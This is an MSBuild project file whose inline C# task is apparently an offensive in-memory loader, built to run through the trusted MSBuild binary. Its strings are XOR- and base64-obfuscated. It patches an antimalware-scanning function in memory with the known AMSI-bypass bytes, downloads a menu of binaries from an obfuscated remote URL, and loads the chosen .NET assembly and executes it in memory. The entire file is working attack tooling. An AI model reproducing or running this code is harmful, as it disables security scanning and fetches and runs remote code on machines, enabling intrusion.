<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample/>
  </Target>
  <UsingTask
  TaskName="ClassExample"
  TaskFactory="CodeTaskFactory"
  AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
	      <![CDATA[	  

using System;using System.Collections.Generic;using System.IO;using System.Net;using System.Text;using System.Reflection;using System.Runtime.InteropServices;using System.Text.RegularExpressions;//This if for MSBuild LOL bin stuff laterusing Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class AnthrophoreShowboats{    private static WebClient IrrisorGimbawawed = new WebClient() { };
	[DllImport("kernel32", EntryPoint = "VirtualProtect")]
    private static extern bool MomentarinessOmen(IntPtr VinegaretteVaporize, UIntPtr AmicablyBooklike, uint HyperhilariousPhytoma, out uint EpitheliomatousAnticonductor);
	[DllImport("kernel32", EntryPoint = "LoadLibrary")]
    private static extern IntPtr FermentsFchar(string LoofsDanism);
	[DllImport("kernel32", EntryPoint = "GetProcAddress")]
    private static extern IntPtr FomitesDialectally(IntPtr SemigodOverfactiously, string ComponentOmitis);
	private static byte[] SatisfactionlessManometric(byte[] CircumtonsillarJayhawker, string IncapacitantDisbelievinglystring)
    {
        byte[] IncapacitantDisbelievingly = Encoding.UTF8.GetBytes(IncapacitantDisbelievinglystring);
        byte[] StypticalHoodmen = new byte[CircumtonsillarJayhawker.Length];
        for (int i = 0; i < CircumtonsillarJayhawker.Length; i++)
        {
            StypticalHoodmen[i] = (byte)(CircumtonsillarJayhawker[i] ^ IncapacitantDisbelievingly[i % IncapacitantDisbelievingly.Length]);
        }
        return StypticalHoodmen;
    }
	private static void MetrotometryAgba(MethodInfo RecandescenceTwatchel, object[] FoldskirtLathes = null)
    {
        RecandescenceTwatchel.Invoke(null, FoldskirtLathes);
    }
	public static int MonadelphousArthromeric()
    {
        uint DebaucheryLiverwurst = 0;
        var SubfuscEnheritage = IntumescingLaciniated();
        MomentarinessOmen(SubfuscEnheritage, (UIntPtr)SleepyheadPantomorphic().Length, 0x40, out DebaucheryLiverwurst);
        Marshal.Copy(SleepyheadPantomorphic(), 0, SubfuscEnheritage, SleepyheadPantomorphic().Length);
        return 0;
    }
	public static Assembly WhipstitchUncriticizably(byte[] ReacidifiedRestiness)
    {
        return Assembly.Load(ReacidifiedRestiness);
    }
	public static byte[] TetrasomeEarthworms(string ChurningChildren)
    {
        return File.ReadAllBytes(ChurningChildren);
    }
	public static void Main(string[] args)
    {
        MonadelphousArthromeric();
        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
        Console.WriteLine(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("F0QzVBclCQ0dKR8LCUxFKikRIhsIBwAe"), "LenticelsNibbled")));
        while (true)
        {
            try
            {
                if (args.Length == 0)
                {
					Regex DemiquaverDeuterodome = new Regex(@Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("EU4pKkY7AGkTLgtCQ1NZCRFPEAIF"), "MarkkaaDisprofit")), RegexOptions.IgnoreCase);
                    MatchCollection SyenitesEctocarpaceous = DemiquaverDeuterodome.Matches(IrrisorGimbawawed.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("LCk5VRAgJFA4AHUPDz0mCik2IhAqWlASOEkWEjcyQQspDAcXP1hcChA8NBc3MiYJLghSVRAFPwo4S30JDVYmCS4IUiYSP1wOFxQgDQ0SSVg="), "MakeshiftyLanete"))))));
                    List<string> ForeribsYankees = LimaconsBelies(SyenitesEctocarpaceous);
                    Console.WriteLine("[+] Select a binary (number)>");
                    Console.WriteLine(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("bkFCXkhZS1hBYExDSl9MWUhuQUJeSFlL"), "ClosetfulMangrate")));
                    Console.WriteLine(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("C1UpUkJMLB4AF2ghEh0/BzEBEQA="), "PetrolificHowish")));
                    for (int RnHolostomous = 0; RnHolostomous < ForeribsYankees.Count; RnHolostomous++)
                    {
                        Console.WriteLine(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("CA=="), "SavoryNonconvertibility")) + (RnHolostomous + 1) + Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("Hk9DUw=="), "ConstitutivenessNonfeeding")) + ForeribsYankees[RnHolostomous]);
                        if (RnHolostomous == ForeribsYankees.Count - 1)
                        {
                            Console.WriteLine(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("CA=="), "SavoryNonconvertibility")) + (RnHolostomous + 2) + Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("CE5JRTEGBwYKDE0GIDcpThsnTjE3PlM="), "UnderstreamVacant")));
                        }
                    }
                    Console.WriteLine(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("bkxOTkxPRF5uQlhfWUFEQ0puTE5OTE8="), "CaccabisCourtling")));
                    var NoninformativeSophrosyne = Console.ReadLine();
                    if (Convert.ToInt32(NoninformativeSophrosyne) == 0)
                    {
                        System.Environment.Exit(1);
                    }
                    else if (Convert.ToInt32(NoninformativeSophrosyne) - 1 == ForeribsYankees.Count)
                    {
                        Console.WriteLine(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("FF04UjsHFxoGTwwcNBBBGxgcbyM3PlJGRyMdDBQfYTIAAAdSYFYBGwAMBBtSAxwdKkIVG08QJhgEAAs="), "OverrigorousAbator")));
                        string VegetocarbonaceousFurfooz = Console.ReadLine();
                        Console.WriteLine(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("CEotUj8VChgABwxUOD4VDA0fCB4IAh4gCAMxAAkCAgYODAYYJB0XQgkGHkkVVy5BTg=="), "SaprogenicityPreboiling")), VegetocarbonaceousFurfooz);
                        string UppuffSententia = Console.ReadLine();
                        UpsurgenceMucate("", UppuffSententia, VegetocarbonaceousFurfooz, false);
                    }
                    else if (Convert.ToInt32(NoninformativeSophrosyne) - 1 > ForeribsYankees.Count | Convert.ToInt32(NoninformativeSophrosyne) - 1 < 0)
                    {
                        Console.WriteLine(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("GFQ0RCMFC3E8AQQQEW9VGhYYRQ=="), "CuidadoQuotee")));
                    }
                    else
                    {
                        Console.WriteLine(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("CEotUj8VChgABwxUOD4VDA0fCB4IAh4gCAMxAAkCAgYODAYYJB0XQgkGHkkVVy5BTg=="), "SaprogenicityPreboiling")), ForeribsYankees[Convert.ToInt32(NoninformativeSophrosyne) - 1]);
                        string UppuffSententia = Console.ReadLine();
                        UpsurgenceMucate(ForeribsYankees[Convert.ToInt32(NoninformativeSophrosyne) - 1], UppuffSententia);
                    }
                }
                else
                {
                    string ForelegDelved = "";
                    string FoeffmentImmeasurable = "";
                    bool EncaumaWoodsheddi = false;
                    foreach (var argument in args)
                    {
                        if (argument.ToLower().Contains(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("EwAAAwoXBxc7JAIfFRsWDw=="), "ColocynthImpassably"))))
                        {
                            var SovietizedCoenamor = Array.IndexOf(args, argument) + 1;
                            if (SovietizedCoenamor < args.Length)
                            {
                                var NondevoutlyInspiring = args[Array.IndexOf(args, argument) + 1];
                                if (EncaumaWoodsheddi)
                                    ForelegDelved = Encoding.UTF8.GetString(Convert.FromBase64String(NondevoutlyInspiring));
                                else
                                    ForelegDelved = NondevoutlyInspiring;
                            }
                        }
                        if (argument.ToLower().Contains(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("Nl5B"), "ThunderflowerConsecration"))))
                            EncaumaWoodsheddi = true;
                        if (argument.ToLower().Contains("args"))
                        {
                            var SovietizedCoenamor = Array.IndexOf(args, argument) + 1;
                            if (SovietizedCoenamor < args.Length)
                            {
                                var NondevoutlyInspiringArgs = args[Array.IndexOf(args, argument) + 1];
                                if (EncaumaWoodsheddi)
                                    FoeffmentImmeasurable = Encoding.UTF8.GetString(Convert.FromBase64String(NondevoutlyInspiringArgs));
                                else
                                    FoeffmentImmeasurable = NondevoutlyInspiringArgs;
                            }
                        }
                    }
                    if (args.Length == 1 && string.IsNullOrEmpty(FoeffmentImmeasurable) && string.IsNullOrEmpty(ForelegDelved) && !EncaumaWoodsheddi)
                    {
                        ForelegDelved = args[0];
                    }
                    if (args.Length == 2 && string.IsNullOrEmpty(FoeffmentImmeasurable) && string.IsNullOrEmpty(ForelegDelved) && !EncaumaWoodsheddi)
                    {
                        FoeffmentImmeasurable = args[1];
                        ForelegDelved = args[0];
                    }
                    if (args.Length == 3 && string.IsNullOrEmpty(FoeffmentImmeasurable) && string.IsNullOrEmpty(ForelegDelved) && EncaumaWoodsheddi)
                    {
                        ForelegDelved = Encoding.UTF8.GetString(Convert.FromBase64String(args[1]));
                        FoeffmentImmeasurable = Encoding.UTF8.GetString(Convert.FromBase64String(args[2]));
                    }
                    if (args.Length == 2 && EncaumaWoodsheddi)
                    {
                        if (!string.IsNullOrEmpty(args[1]))
                            ForelegDelved = Encoding.UTF8.GetString(Convert.FromBase64String(args[1]));
                    }
                    if (!string.IsNullOrEmpty(ForelegDelved))
                    {
                        Console.WriteLine(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("CEU8UCMdBAA3BhsJVB5CDVIYDgYJTQwbCRRzFVAN"), "SnappierCounterprogramming")), ForelegDelved, FoeffmentImmeasurable);
                        UpsurgenceMucate("", FoeffmentImmeasurable, ForelegDelved, false);
                        Environment.Exit(0);
                    }
                    Environment.Exit(0);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("GlItSScSOQteRR0dUwUAGRkJBV5hBx9JARIw"), "AspicsTeretiscapular")));
                Console.WriteLine(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("GE40Rh1VCA=="), "CoiffeusesMisdirecting")), ex.Message);
                Environment.Exit(0);
            }
        }
    }
	private static byte[] SleepyheadPantomorphic()
    {
        if (System.Environment.Is64BitOperatingSystem)
            return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
    }
	public static byte[] ClimacticallyVraisemblance(string BalanopsidaceaeWorkmanliness)
    {
        return IrrisorGimbawawed.DownloadData(BalanopsidaceaeWorkmanliness);
    }
	private static MethodInfo SemimemberWronging(Assembly AlaskanSunderment)
    {
        return AlaskanSunderment.EntryPoint;
    }
	private static List<string> LimaconsBelies(MatchCollection InconcerninoAdvice)
    {
        var IliotibialUntimeliness = new List<string>() { };
        foreach (object partyBear in InconcerninoAdvice)
        {
            string SubfuscEnheritageerFruit = partyBear.ToString().TrimStart('/');
            if (SubfuscEnheritageerFruit.Length > 1)
                IliotibialUntimeliness.Add(SubfuscEnheritageerFruit);
        }
        return IliotibialUntimeliness;
    }
	private static IntPtr IntumescingLaciniated(bool IntermittencePatroniser = false)
    {
        Console.WriteLine(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("CE4wSSkKGhcGAAFPMyA6OlQvBwYVFQEcPQ=="), "SeminonconformistChetahs")));
        return FomitesDialectally(FermentsFchar(Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("FDJFGw0/XBgWFR9S"), "MetallistRhodamine"))))), Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("AjleDQM3IgYqAlsxASE/HykxK1E="), "SnowballsUnreversibleness")))));
    }
	public static void UpsurgenceMucate(string VirasonFormols, string FlirtatiouslyBrasher = "", string KosimoReirrigate = "", bool DeterioratingPuppeteers = true)
    {
        var SneezierPimento = new object[] { new string[] { FlirtatiouslyBrasher } };
        if (!DeterioratingPuppeteers)
        {
            if (!KosimoReirrigate.StartsWith(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("LB0HEQ=="), "DisabusedBabus"))))
            {
                MetrotometryAgba(SemimemberWronging(WhipstitchUncriticizably(TetrasomeEarthworms(KosimoReirrigate))), SneezierPimento);
            }
            else
            {
                MetrotometryAgba(SemimemberWronging(WhipstitchUncriticizably(ClimacticallyVraisemblance(KosimoReirrigate))), SneezierPimento);
            }
        }
        else
        {
            MetrotometryAgba(SemimemberWronging(WhipstitchUncriticizably(ClimacticallyVraisemblance(Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("LCk5VRAgJFA4AHUPDz0mCik2IhAqWlASOEkWEjcyQQspDAcXP1hcChA8NBc3MiYJLghSVRAFPwo4S30JDVYmCS4IUiYSP1wOFxQgDQ0SSVg="), "MakeshiftyLanete")))).Replace(Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("PxMWDQ=="), "KashimGradate")), Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("KwIJEA=="), "InfringingHoverport"))) + Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("fA=="), "ShamateurismLemmata")) + VirasonFormols + Encoding.UTF8.GetString(SatisfactionlessManometric(Convert.FromBase64String("bAsPFEQAGxoI"), "SyncytiomaStigmatiser"))))), SneezierPimento);
        }
    }
	    
		 //This is for MSBuild later
		public class ClassExample : Task, ITask
		{
		    public override bool Execute()
		    {
		        AnthrophoreShowboats.Main(new string[] { });
		        return true;
		    }
		}
		
}

 ]]>
	</Code>	  
    </Task>
  </UsingTask>
</Project>